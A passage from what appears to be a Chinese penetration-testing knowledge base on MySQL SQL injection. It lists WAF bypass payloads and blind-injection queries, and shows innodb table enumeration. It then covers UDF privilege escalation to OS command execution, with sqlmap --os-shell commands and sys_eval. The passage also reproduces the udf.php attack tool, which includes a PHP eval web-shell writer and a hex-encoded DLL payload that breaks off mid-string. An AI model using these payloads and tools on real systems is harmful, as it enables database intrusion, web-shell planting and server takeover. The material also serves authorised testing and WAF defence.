绕过注释符 绕过函数检测 绕过关键词 绕过order by 绕过select 通用方法 通用的方法，就是万金油，无非就是大小写、双写、编码、注释、HPP、垃圾字符、分块传输、WAF特性 官方函数文档：https://dev.mysql.com/doc/refman/8.0/en/functions.html 编码 编码无非就是hex、url等等编码，让传到数据库的数据能够解析的即可，比如URL编码一般在传给业务的时候就会自动解码。 内联注释 可以插到括号中，但是必须要保证单词的完整 select 1/*!union*/select 2; select /*!user(*/); /*!41320select/*!/*!10000user/*!(/*!/*!/*!*/); 绕过空格 空格被过滤的情况，可以用如下的一些手法： 说明 Payload 使用注释符 select/**/user();select/*hahaha*/user(); URL编码空格 + 其他URL编码（换行、Tab等） %0d、%0a、%09、%0b、%a0 使用括号，括号是用来包围子查询的；因此任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格 select(user())from(t_user); 如果是and/or后面的空格需要绕过的话，可以跟上奇或者偶数个!、~来替代空格，也可以混合使用(规律有不同，可以自己本地尝试)，and/or前的空格可用省略 select * from user where username=\"test\"and!!!1=1; select * from user where username=\"test\"and~~~~1=1; select * from user where username=\"test\"and~~!!!~~1=1; 也可以用+、-来替代空格，and后有偶数个-即可，+的个数随意 select * from user where username=\"test\"and------1=1; select * from user where username=\"test\"and+++---+++---+++1=1; 绕过引号 十六进制hex() 单/双引号被过滤，一般采用16进制绕过，特殊情况可采用宽字节注入 Python 一句话字符串转16进制 s=\"test\" # 假设要转换的字符串为test，结果为 0x74657374 \"0x\" + \"\".join([hex(ord(c)).replace('0x', '') for c in s]) sql一句话 select concat(\"0x\",hex(\"test\")); 绕过Payload -- 原语句 select table_name from information_schema.tables where table_schema='test'; -- 16进制后 select table_name from information_schema.tables where table_schema=0x74657374; char() 除了上面的十六进制外，还可以用char函数连接起来 select table_name from information_schema.tables where table_schema='test'; -- char后 select table_name from information_schema.tables where table_schema=char(116,101,115,116); 绕过逗号, 一般较多出现在需要使用limit、substr/mid等函数时 针对普通情况（使用join） -- 原语句 select user(),database(); -- 绕过 select * from (select user())a join (select database())b; 针对limit（使用offset） -- 原语句 select * from t_user limit 1,1 -- 绕过 select * from t_user limit 1 offset 1; 针对切割函数 1、使用from for -- 原语句 select substr(username,1,1) from t_user; -- 绕过 select substr(username from 1 for 1) from t_user; 2、不使用切割函数，采用模糊或者正则匹配的方法 -- 原语句 select substr(username,1,1) from t_user; -- 绕过 select username from t_user where username like \"u%\"; 绕过等号= 过滤了等号或者相关的匹配符，可以采用如下的一些手法来绕过 Payload 说明 <>、>、 不等符、大于、小于 select 1 between 1 and 2;select 1 not between 1 and 2; between语句，在两值之间 select 1 in (1);select 1 not in (1); in语句，在集合中 select '123' like '1%'; like模糊匹配 select '123' regexp '^12.*'; regexp正则匹配 select '123' rlike '^12.*'; Rlike正则匹配 select regexp_like(\"abc\",\"^ab\"); regexp_like函数正则匹配 绕过and/or 如果不能大小写、双写、注释等万金油手法绕过的话，可以试试下面的方法 因为and和or主要也是起到连接我们拼接语句的作用，那我们找其他类似功能的算术符等即可 Payload 说明 select * from user where age=666 && 1; and的符号版 `select * from user where age=666 1;` or的符号版 select * from user where age=666 ^ 0; 按位与、或、异或、位移 &｜^ > select * from user where age=666 - sleep(2); 加减乘除mod+-*/ div % mod（尽量不要使用，会休眠2*数据条数这么多秒） 贴一张菜鸟教程的图 [!TIP|style:flat] 如果上面都不行的话，可以考虑采用False注入来绕过 绕过括号 小括号被过滤，诸如substring()等字符串截取函数无法使用，可以用like 或者 regexp 通过正则来一位一位的比较绕过 [!TIP|style:flat] 一般用于盲注的情况，根据返回结果是true/false来判断 获取所有数据库名 -- 所有数据库名 select distinct table_schema from information_schema.tables where table_schema like \"%%\"; -- t开头的数据库名 select distinct table_schema from information_schema.tables where table_schema like \"t%\"; -- 所有数据库名 select distinct table_schema from information_schema.tables where table_schema regexp \"^.*$\"; -- t开头的数据库名 select distinct table_schema from information_schema.tables where table_schema regexp \"^t.*$\"; 获取表名 以数据库test为例 select distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^u.*$\"; -- true select distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^us.*$\"; -- true select distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^usa.*$\"; -- false 获取列名 此时表名test.user select distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^.*$\"; -- true select distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^a.*$\"; -- true select distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^ab.*$\"; -- false 绕过注释符 对注释符过滤的情况下，对我们来说问题可能就是语句不能正常执行 解决办法也很简单，用完整语句给他闭合就OK了，其他语句类似 # 原始 ?id=1 # 完整闭合 ?id=1' and expr and '1'='1 绕过函数检测 一些函数如ascii等被过滤，可以使用等价的函数进行绕过，如 过滤函数 等价函数 ascii() hex()、ord()、bin() sleep() benchmark() 等，很多，还是得自己去研究mysql的函数才行 绕过关键词 如果过滤的内容中间有连接符.，比如过滤information_schema.tables，那么可以通过空格或者反引号来绕过 -- 空格 select distinct table_name from information_schema . tables; -- 反引号 select distinct table_name from `information_schema`.`tables`; 如果是指定了关键词union select，那么可以尝试使用union all select和union distinct select 而有些比较暴力的WAF直接对关键词进行过滤，比如出现information_schema就过滤掉 绕过方法：使用\\n，\\n会被当成null，在语句中没啥影响 select table_name from informa\\n\\n\\ntion_sch\\n\\n\\nema.tables; 也可以替换关键词，如不使用information_schema，而是使用innodb_table_stats等，详见：innodb存储引擎 绕过order by 除了绕过关键词手法，过滤了order by，还可以考虑使用group by select * from user order by 1; select * from user group by 1; 也可以使用into变量名进行替代 select * from user where age=111 into @a; select * from user where age=111 into @a,@b; 绕过select [!NOTE|style:flat] 个人感觉非常鸡肋 1、可以使用handler HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name { = | = | } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 举例：没找到实际利用场景 -- user是表名 -- 打开句柄 handler user open; -- 读取数据 handler user read first; handler user read next; 2、mysql8.0.19+使用table和values关键词 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] table user; -- 等价于 select * from user; VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number] row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] value_list: value[, value][, ...] column_designator: column_index values row(1,2) union select * from user; -- 等同于 select 1,2 union select * from user; Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-08 14:06:53 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/04.innodb存储引擎.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/04.innodb存储引擎.html","title":"04.innodb存储引擎","keywords":"","body":" 前言 innodb_index_stats innodb_table_stats Payload汇总 前言 大多数有WAF的情况下，使用一些敏感词如information_schema会被直接过滤掉，但是可以使用innodb存储引擎来绕过这个限制 从Mysql5.5开始，默认的数据存储引擎就为InnodDB，执行命令select @@innodb_version就会显示出innoDB的版本（和Mysql一样） 从5.6起，InnoDB新增加了两张表innodb_index_stats与innodb_table_stats，这两张表记录了所有新建的数据库与表 [!WARNING] 不幸的是InnoDB没有记录字段，所以只能用于获取数据库名和表名 innodb_index_stats 查看表结构，可以明显的看到有2个字段：database_name和table_name desc innodb_index_stats; 查看内容 很明显，前两列分别是我们的数据库名和表名 因此注入的时候可以通过这个表来获取数据库名和表名 Payload: -- 查询所有新增数据库 select group_concat(distinct database_name) from innodb_index_stats; -- 查询数据库test中的所有表名 select group_concat(distinct table_name) from innodb_index_stats where database_name=\"test\"; innodb_table_stats 和上面类似，都有database_name和table_name，所以上面改下表明就可以了 -- 查询数据库test中的所有表名 select group_concat(distinct table_name) from innodb_table_stats where database_name=\"test\"; Payload汇总 其实还是很简单，就是新版本的mysql中多了两个表mysql.innodb_index_stats和mysql.innodb_table_stats，然后这俩个表存储了数据库名和表名 -- 查询所有新增数据库 select group_concat(distinct database_name) from mysql.innodb_index_stats; -- 查询数据库test中的所有表名 select group_concat(distinct table_name) from mysql.innodb_index_stats where database_name=\"test\"; -- 查询当前数据库中的所有表名 select group_concat(distinct table_name) from mysql.innodb_index_stats where database_name=schema(); Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/05.UDF提权.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/05.UDF提权.html","title":"05.UDF提权","keywords":"","body":" UDF介绍 需要条件 Windows Linux 过程 上传so/dll到plugin 执行命令 简化操作 Sqlmap php大马 MSF UDF介绍 UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 需要条件 Windows 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\\plugin\\文件夹下（windows下默认这个目录是不存在的，所以需要有权限创建） 如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\\windows\\system32目录，在windows server 2000下放置在c:\\winnt\\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 Linux 放到mysql安装目录的lib\\plugin\\即可 show variables like '%plugin%'; 过程 上传so/dll到plugin 现在基本都是>5.1了，所以一些都按照>5.1为主吧，演示系统为linux .so ==> linux .dll ==> windows 先把sqlmap自带的可以执行命令的UDF文件进行解码 [!note] 这个脚本在sqlmap的/extra/cloak目录下，自带就有 python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ 然后通过各种手法给解码的so文件（windows用dll）放到目标的plugins目录下 可以用select unhex(...) into dumpfile \"/usr/lib/mysql/plugin/lib_mysqludf_sys.so\" xxd -ps lib_mysqludf_sys.so可以获取到文件的十六进制 也可以直接上传（如果权限够） 执行命令 [!note] 可以直接mysql连进去，也可以用sqlmap --sql-shell 创建函数 -- 引用共享库文件创建存储过程 create function sys_eval returns string soname \"lib_mysqludf_sys.so\"; 执行命令 select sys_eval(\"whoami\"); 清除 drop function sys_eval; 简化操作 Sqlmap sqlmap既然作为神器，肯定也包含了UDF提权的功能 python3 sqlmap.py -d mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME python3 sqlmap.py -d \"mysql://root:@10.8.194.18:3306/mysql\" --os-shell sqlmap在执行的过程中，会创建一个表sqlmapoutput，执行结束后会删除 php大马 https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php T00ls UDF.PHP input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;} function outfile(){ document.getElementById(\"sql2\").value= unescape(\"select%20%27%3C%3Fphp%20eval%28%24_POST%5B%5C%27pass%5C%27%5D%29%3F%3E%27%20into%20outfile%20%27d%3A%5C%5Cninty.php%27\"); } function loadfile(){ document.getElementById(\"sql2\").value = unescape(\"select%20load_file%28%27c%3A%5C%5Cboot.ini%27%29\"); } ip:uid:pwd:db:&nbsp;'; } function func(){ $conn = conn(false); mysql_select_db('mysql',$conn); mysql_query('CREATE TABLE `func` ( `name` char(64) collate utf8_bin NOT NULL default \\'\\', `ret` tinyint(1) NOT NULL default \\'0\\', `dl` char(128) collate utf8_bin NOT NULL default \\'\\', `type` enum(\\'function\\',\\'aggregate\\') character set utf8 NOT NULL, PRIMARY KEY (`name`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\\'User defined functions\\''); if (mysql_errno($conn) != 0) { echo mysql_error() . ''; } echo 'Create mysql.func success !'; mysql_close($conn); } function conn($close = true) { if (isset($_SESSION['host'])) { $host = $_SESSION['host']; $uid = $_SESSION['uid']; $pwd = $_SESSION['pwd']; $db = $_SESSION['db']; } else { $host = $_POST['host']; $uid = $_POST['uid']; $pwd = $_POST['pwd']; $db = $_POST['db']; } $conn = mysql_connect($host,$uid,$pwd); if (!$conn) { echo mysql_error().''; vConn(); exit(); } mysql_select_db($db,$conn); if (mysql_errno($conn) != 0) { echo mysql_error().''; vConn(); exit(); } $_SESSION['host'] = $host; $_SESSION['uid'] = $uid; $_SESSION['pwd'] = $pwd; $_SESSION['db'] = $db; //mysql_query('set names utf8'); showM($conn,$close); return $conn; } function logout(){ unset($_SESSION['host']); unset($_SESSION['uid']); unset($_SESSION['pwd']); unset($_SESSION['db']); unset($_SESSION['notsame']); unset($_SESSION['over51']); unset($_SESSION['plugindir']); $url = $_SERVER['PHP_SELF']; $filename = end(explode('/',$url)); echo 'location.href = \"'.$filename.'?rn=\"+Math.random()'; } function showM(&$conn,$close = true){ echo 't00ls UDF.PHP'; echo ''; echo ''; $sql = 'select concat(\\'user():\\',user()) as m union select concat(\\'database():\\',database()) union select concat(\\'datadir:\\',@@datadir) union select concat(\\'basedir:\\',@@basedir) union select concat(\\'version():\\',version()) ;'; $meta = mysql_query($sql,$conn); $tmp = 1; while ($row = mysql_fetch_array($meta,MYSQL_ASSOC)) { echo $row['m']; if ($tmp == 1) { $tmp = 2; $h = substr($row['m'],strpos($row['m'],'@')+1); if ($h != 'localhost') { echo ' [web and db is not the same server.]'; $_SESSION['notsame'] = 'true'; } } echo ''; } echo 'plugin_dir:'; $meta = mysql_query('show variables like \"plugin_dir\"'); if (mysql_num_rows($meta)==0) { echo 'mysql is under 5.1 , '; if (!isset($_SESSION['notsame'])) echo ' u can dump udf.dll to any directory in follow paths'; echo ''; } else { //over 5.1 $_SESSION['over51'] = 'true'; $row = mysql_fetch_row($meta); $_SESSION['plugindir'] = str_replace('\\\\','\\\\\\\\',str_replace('/','\\\\',$row[1])).'\\\\\\\\udf.dll'; echo ''.str_replace('/','\\\\',$row[1]).''; echo ' (mysql over 5.1, udf.dll can only dump to plugin_dir) '; if (isset($_SESSION['notsame'])) echo ' [maybe dump dll will be failed!]'; else { if (!file_exists(str_replace('/','\\\\',$row[1]))) echo ' Create PluginDir'; else echo ' exists!'; } } echo ''; if (!isset($_SESSION['notsame']) && !isset($_SESSION['over51'])) echo 'path:'.getenv('path').''; $meta = mysql_query('select 1,1,1,1 from mysql.user union select * from mysql.func'); if (mysql_num_rows($meta)==0) echo 'Mysql.Func : dont exist! must create mysql.func first!'; else echo 'Mysql.Func : exist!'; echo ''; echo 'grants : '; $meta = mysql_query('show grants;',$conn); while ($row = mysql_fetch_row($meta)) { echo $row[0]; } echo ''; echo ''; if ($close) mysql_close($conn); echo ''; if (isset($_POST['path'])) { $path = $_POST['path']; if (get_magic_quotes_gpc()) $path = stripslashes($path); } else $path = isset($_SESSION['plugindir']) ? $_SESSION['plugindir'] : 'c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\udf.dll'; echo ' '; echo ' '; echo ' please convert \\\\ to \\\\\\\\'; if (isset($_POST['sql'])) $sql = $_POST['sql']; else $sql = 'select * from mysql.user'; if (get_magic_quotes_gpc()) $sql = stripslashes($sql); if (isset($_POST['dump'])) $sql = 'select shell(\\'cmd\\',\\'whoami\\')'; echo ''.$sql.' '; } function cplug(){ $path = $_GET['dir']; $path = base64_decode($path); $arr = explode('\\\\',$path); $p = ''; $err = ''; for ($index = 0,$count = count($arr);$index 0) { echo ''; $cols = mysql_num_fields($rs); $index = 0; echo ''; while ($index '.mysql_field_name($rs,$index).''; $index ++; } echo ''; while ($row = mysql_fetch_row($rs)) { $index = 0; echo ''; while ($index '; echo str_replace(chr(13),'',htmlspecialchars($row[$index])); echo ''; $index ++; } echo ''; } echo ''; } if (mysql_errno($conn) != 0) echo mysql_error(); mysql_close($conn); } function cp(){ $conn = conn(false); $source = $_POST['source']; $target = $_POST['target']; if (get_magic_quotes_gpc()) { $source = stripslashes($source); $target = stripslashes($target); } mysql_query('select unhex(hex(load_file(\"'.$source.'\"))) into dumpfile \"'.$target.'\"'); if (mysql_errno($conn) != 0) echo mysql_error().''; else echo 'done !'; mysql_close($conn); } function install() { //dump udf.dll $conn = conn(false); $path = $_POST['path']; if (get_magic_quotes_gpc()) $path = stripslashes($path); mysql_query('create table udftmp (c blob)'); if (mysql_errno($conn) != 0) { echo mysql_error().''; mysql_query('drop table udftmp'); mysql_close($conn); exit(); } mysql_query('insert into udftmp values(convert(0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000080100000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000007148657F35290B2C35290B2C35290B2C35290B2C3F290B2CF626562C31290B2C4E35072C34290B2C5A36012C31290B2CB635052C36290B2C5A360F2C31290B2C5A36002C34290B2C5736182C3E290B2C35290A2C56290B2CF6266B2C38290B2CF626572C34290B2CF626512C34290B2C5269636835290B2C00000000000000000000000000000000504500004C010400BFC7514B0000000000000000E0000E210B01070A00220000001C0000000000002D300000001000000040000000000010001000000002000004000000000000000400000000000000008000000004000000000000020000000000100000100000000010000010000000000000100000002052000070000000A44A0000B40000000000000000000000000000000000000000000000000000000070000064020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000004C0100000000000000000000000000000000000000000000000000002E746578740000000C210000001000000022000000040000000000000000000000000000200000602E7264617461000090120000004000000014000000260000000000000000000000000000400000402E64617461000000500000000060000000020000003A0000000000000000000000000000400000C02E72656C6F630000080400000070000000060000003C00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000558BEC83EC14578D45FC506A28FF156040001050FF151C4000108B450CF7D81BC083E0028945F88D45F050FF7508C745EC010000006A00FF15204000106A006A006A108D45EC506A00FF75FCFF15244000108BF885FF7500FF75FCFF15A44000108BC75FC9C3558BEC81EC8004000053568B35804000105733DB538D45D4508D45EC5033FF8D45F44750885DFF885DFEC745D40C000000895DD8897DDCFFD685C00F84F3000000538D45D4508D45E4508D45F050FFD685C00F84DC0000008D458050FF15844000108B45F08945B88B45EC8945C08945BC8D45C4508D458050535353575353FF750CC745AC010100005366895DB0FF158840001085C00F84980000008B3534400010C645FF01FFD68B3D8C4000108945E8EB67395DF87642B8000400003945F872038945F8538D45E050FF75F88D8580FBFFFF50FF75F4FF159040001085C07453FF75E08B4D088B018D9580FBFFFF52FF5004FFD68945E8EB1853FF75C4FF159440001085C0742CFFD62B45E83B4510731E6A07FF159C400010538D45F850535353FF75F4895DF8FFD785C07585EB04C645FE01FF15A0400010385DFF8B35A44000108BF8741E385DFE740F395D14740A53FF75C4FF15A8400010FF75C8FFD6FF75C4FFD6395DF07405FF75F0FFD6395DEC7405FF75ECFFD6395DE47405FF75E4FFD6395DF47405FF75F4FFD657FF15B04000105F5E33C05BC9C3837C24040274138B44240C8B08686041001050FF51085959EB48568B74240C57566A02E8A2010000050004000050FF1508410010FF76048BF8685041001057FF15044100106A0168E02E000057FF742438E80FFEFFFF57FF150041001083C42C5F5E33C0C3837C24040274138B44240C8B08687C41001050FF51085959EB1A8B4424086A0068D0070000FF7004FF742418E8CFFDFFFF83C41033C0C38BC18B4C24048948088B4C240889480C8A4C240CC70098410010884804C7401002000000C20C00C70198410010C3F644240401568BF1C70698410010740756E8021C0000598BC65EC20400565733FF8BF147397E087E52807E04008B460C8B04B88A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C05959740D473B7E087CAE32C05F5EC20400B001EBF756578BF1836614006A025F397E087E62807E04008B460C8B44B8FC8A08741D80F92F740580F92D753440803800742EFF74240C50FF150C410010EB1B80F92F740580F92D7517408038007411FF74240C50FF15F840001085C059597408473B7E087CADEB0D8B460C8B04B847894614897E108B46145F5EC20400565733FF33F6397C240C7E188B442410FF34B8E8111B0000473B7C2410598D7406017CE85F8BC65EC333C0390510600010740D5050A310600010FF15444100108B0D24600010E89A0E00008B4C240489410C32C0C38B442404FF700C8B0D24600010E875180000C3558BEC518B0D246000108365FC00568B7514568D45FC508B450CFF7008FF308B4508FF700CE80F190000833EFF7516837DFC00740DFF75FCE8841A0000598906EB038326008B45FC8B551885C00F94C1880A5EC9C3837C240801752B8B4424046A2CA320600010E85B1A000085C05974098BC8E879180000EB0233C085C0A324600010752AEB2B837C24080075218B0D2460001085C97417568BF1E8BE17000056E80A1A000083252460001000595E33C040C20C00558BEC83EC1453578D45F8506A08FF750833DB895DF8895DF4FF151C4000108BF83BFB7467568B35144000108D45FC5053536A01FF75F8895DFCFFD6395DFC8BF87648FF75FCE8C7190000598D4DFC51FF75FC8945F4506A01FF75F8FFD68BF83BFB74278D45EC508D45F050FF750C8D451450FF75108B45F4C745F004010000FF3053FF15184000108BF85E395DF87409FF75F8FF15A4400010395DF47409FF75F4E854190000598BC75F5BC9C38B4424048B0868A041001050FF51085959C3558BECB838250000E85B1900006683A5D4FDFFFF006683A5D8FEFFFF005356576A4033C0598DBDD6FDFFFFF3AB66AB6A4033C0598DBDDAFEFFFFF3AB33DB43395D0C66AB8BC3C645FD00C645FA00C645FF00C645FE00C645FB00C645FC008945F40F86B30000008B75108B3DFC400010C1E0028B0C3080392D75710FBE510183EA6B743A4A74314A7562837D0C030F8C900000008A490280F970C645FA01741280F97375478B443004C645FE018945DCEB3AC645FF01EB1DC645FD01EB2E837D0C037C670FBE490283E96E74144949751BC645FB01FF743004FFD7598945ECEB0B8B443004C645FC018945E08B45F4403B450C8945F40F8274FFFFFF807DFD007530807DFF00752A807DFE007524807DFB00751E807DFC007518FF7508E8CCFEFFFFEB4368CC420010EB3268B0420010EB2B53689C420010E81BF9FFFF59598D45E45068001000008D85C8DAFFFF50E8E619000085C0751768804200108B45088B0850FF510859598BC3E9B30200008365F400F745E4FCFFFFFF0F86A00200008D9DC8DAFFFFBE04010000FF338B3D384000106A006810040000FFD785C089450C0F84640200008365E80068001000008D85C8EAFFFF6A0050E89A170000568D85D4FDFFFF6A0050E88B170000568D85D8FEFFFF6A0050E87C170000568D85D0FCFFFF6A0050E86D170000568D85CCFBFFFF6A0050E85E170000568D85D4FDFFFF508D85D8FEFFFF50FF750CE82FFDFFFF83C44C8D45E85068001000008D85C8EAFFFF50FF750CE80819000085C0742C568D85D0FCFFFF50FFB5C8EAFFFFFF750CE8E8180000568D85CCFBFFFF50FFB5C8EAFFFFFF750CE8CC180000807DFB0074078B45EC3903741C807DFC007463FF75E08D85CCFBFFFF50FF15CC40001085C05959754DFF750CFF15A4400010FF336A006A01FFD785C08B7D0889450C74358B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4186A00FF750CFF15A8400010EB038B7D08807DFD0074258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C418807DFF0074148B45EC3B03750D8B07685442001057FF50085959807DFA000F84DE0000008365F000F745E8FCFFFFFF0F86CD000000807DFF0074568B45EC3B030F85BC000000568D85C8FAFFFF6A0050E8031600008B7DF083C40C568D85C8FAFFFF508DBCBDC8EAFFFFFF37FF750CE8BA170000FF378B45088B088D95C8FAFFFF52684442001050FF51088B7D0883C410807DFE007459568D85CCFBFFFF508B45F0FFB485C8EAFFFFFF750CE87717000085C0743BFF75DC8D85CCFBFFFF50FF15EC40001085C0595974258B078D8DD0FCFFFF518D8DD4FDFFFF518D8DD8FEFFFF51FF33687042001057FF500883C4188B45E8FF45F0C1E8023945F00F8233FFFFFFFF750CFF15A44000108B45E4FF45F4C1E80283C3043945F40F826BFDFFFF33C05F5E5BC9C3558BEC51568D45FC50681900020033F656FF750CFF7508FF150840001085C075278D451850FF75145656FF7510FF75FCFF150C40001085C07403897518FF75FCFF1510400010EB038975188B45185EC9C3558BEC5151538B5D10578D45FC50FF750C33FF397D20FF7508897DF87508FF1528400010EB2FFF152C40001085C0757957578D4514505753FF75FCFF150C40001085C07564837D2002750E53FF75FCFF150040001085C07550837D1401568B35044000107406837D1402751CFF7518E860140000594050FF7518FF75145753FF75FCFFD685C07520837D140475136A048D451C506A045753FF75FCFFD685C07507C745F8010000005EFF75FCFF15104000108B45F85F5BC9C3558BEC51576810430010FF15404000108BF885FF744A53568B353C40001068FC42001057FFD68BD885DB743268E842001057FFD68BF085F674248D45FC506A016A016A13FFD63D7C0000C0750C8D45FC506A006A016A13FFD6FF7508FFD35E5B5FC9C3566A016870430010E8B7F4FFFF8B7424108B06685843001056FF50088B44241C33C983C4103BC175135151FF152C41001085C075566844430010EB3083F8017514516A06FF152C41001085C0753D6830430010EB1783F802751B516A0CFF152C41001085C07524681C4300108B0656FF500859EB1583F80375046A01EB0783F80475086A02E813FFFFFF5933C0405EC3558BEC837D0C027C288B45108B400480382D751D4050FF15FC40001085C0597C1083F8047F0B50FF7508E841FFFFFFEB0E8B45088B08688843001050FF5108595933C05DC3A13060001085C0752168504400106844440010FF154040001050FF153C40001085C0A3306000107501C36A01FF74240C6A00FFD00FB6C0C3A12860001085C07521686C4400106860440010FF154040001050FF153C40001085C0A3286000107501C36A01FF742408FFD0C3558BEC83EC6456578D45E8508D45E4506A0133FF5757E85D1400003BC78945DC751F8B75088B3EFF15A040001050681045001056FF570883C40C33C0E929010000538B5D088B0368B844001053FF5008397DE88B75E45959897DF00F86FD0000008D45EC508D45FC506A0E897DFC897DF8897DF4FF3657E8F61300008D45EC508D45F8506A0AFF3657E8E41300008D45EC508D45F4506A05FF3657E8D2130000FF7608E825FFFFFF5957576A208D4D9C51508945E0FF15E4400010598D44000250FF75E05757FF15444000108B45FC83380275280FB64809510FB64808510FB648070FB6400651508D45BC68AC44001050FF150441001083C418EB118D45BC68A444001050FF150441001059598B038D4D9C518D4DBC51FF75F8FF75F4FF7604FF36687C44001053FF500883C420FF75FCE836130000FF75F8E82E130000FF75F4E82613000057E82013000083C60CFF45F08B45F03B45E80F8203FFFFFFFF75E4E8061300008B45DC5B5F5EC9C3560FB774240C85F674426A00566A006A0468E045001068984500106802000080E811FCFFFF83C41C85C08B4424088B08740F56686445001050FF510883C40C5EC3683C45001050FF510859595EC3558BEC83EC0C8365F8008365FC0056576A048D45FC50BF9C460010576870460010BE0200008056C745F401000000E864FBFFFF83C41485C07449837DFC0275436A048D45FC5057684046001056E845FBFFFF83C41485C0742A837DFC0275246A048D45F8506834460010BF004600105756E821FBFFFF83C41485C07406837DF800750432C0EB246A048D45F45068EC4500105756E8FEFAFFFF83C41485C07504B001EB07837DF4000F94C05F5EC9C3E84CFFFFFF84C0B9D04600107505B9C44600108B4424048B105168A446001050FF520883C40CC3558BEC83EC108D45FC5068190002006A0068984500106802000080C745F83D0D0000C745F004000000C745F450000000FF150840001085C075488D45F4508D45F8508D45F0506A0068E0450010FF75FCFF150C40001085C0751FFF75F88B45088B0868F046001050FF510883C40CFF75FCFF1510400010C9C3FF75FCFF15104000108B45088B0868D846001050FF51085959C9C3FF742404E83CFFFFFF59E95DFFFFFF515355565733DB536A02536A04BF9C460010576870460010BE0200008056E84CFAFFFF536A02536A0457684046001056E83AFAFFFF8944244833C0385C24546A010F94C0BF0046001050536A0468EC4500105756E816FAFFFF8BE883C4543BEB7406385C241C742133C0385C241C530F95C050536A0468344600105756E8EDF9FFFF83C41C3BC375043BEB7420395C2410741A385C241C8B4424188B0874076850470010EB126830470010EB0B8B4424188B08680C47001050FF510859595F5E5D5B59C3B802310010E8D10E000083EC18837D0C027D158B45088B0868A047001050FF51085959E9EE00000053565733F656FF75108D4DDCFF750CE8ECF1FFFF68984700108D4DDC8975FCE890F2FFFF8B5D0833FF4785C07415FF75F08BF7FF15FC4000105053E80DFDFFFF83C40C68904700108D4DDCE8FBF1FFFF84C0740357EB1368884700108D4DDCE8E7F1FFFF84C0740C6A00538BF7E8A2FEFFFF595968804700108D4DDCE8CAF1FFFF84C07409538BF7E878FEFFFF5968784700108D4DDCE8B0F1FFFF84C07409538BF7E838FBFFFF5968704700108D4DDCE8FFF1FFFF85C07415FF75F08BF7FF15FC4000105053E8A9FAFFFF83C40C85F6750D8B0368A047001053FF50085959834DFCFF8D4DDCE83CF1FFFF5F5E5B8B4DF433C064890D00000000C9C3568B7424108326006A106890490010FF742414E8BF0D000083C40C85C075108B44240889068B0850FF510433C0EB05B8024000805EC20C008B44240483C00450FF1548400010C20400568B742408578D460450FF154C4000108BF885FF750D85F674098B066A018BCEFF500C8BC75F5EC20400F644240401568BF1C70680490010740756E8C10C0000598BC65EC20400568BF18B861C0100005733FF3BC7740D50FF155840001089BE1C0100008B86180100003BC7740D50FF15A440001089BE180100005757576A0457FF760CFF15544000103BC7898618010000750433C0EB15575757681F000F0050FF155040001089861C0100005F5EC383B91C0100000074128B490C83F9FF740A6A0051FF155C400010C333C0C351FF1548400010C38B4424048B1534600010EB028BC18B48083BCA75F7C38B4424048B1534600010EB028BC18B083BCA75F8C38B5424048B02568B700889328B70083B353460001074038956048B72048970048B49043B51045E7505894104EB0F8B4A043B51087505894108EB028901895008894204C20400568BF18B0E83791400750D8B410439480475058B4108EB1E8B013B0534600010740D50E867FFFFFF59EB0B89068BC88B41043B0874F589065EC3568